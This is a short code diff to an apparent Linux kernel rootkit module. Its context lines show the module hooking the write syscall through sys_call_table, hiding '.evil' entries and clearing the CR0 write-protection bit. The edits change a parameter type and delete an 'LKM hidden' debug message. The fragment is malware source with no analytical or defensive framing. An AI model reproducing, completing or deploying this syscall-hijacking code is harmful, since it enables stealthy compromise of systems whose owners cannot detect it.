@@ -60,7 +60,7 @@ psize **find_sys_tab(void) {
 /*
  * Hijacked sys_call
  */
-asmlinkage ssize_t hijack_write(int fd, const char __user *buff, size_t count) {
+asmlinkage ssize_t hijack_write(int fd, const char __user *buff, ssize_t count) {
   int to_return; 
   char *proc_protect = ".evil"; 
   char *kbuff = (char *) kmalloc(256,GFP_KERNEL); 
@@ -87,7 +87,6 @@ int hijack_init(void) {
     printk("hijack: sys_call_table not found\n");
   }
 
-  printk("bla: LKM hidden\n");
   write_cr0(read_cr0() & (~ 0x10000));
   printk("hijack: cr0 write protection removed\n");
 
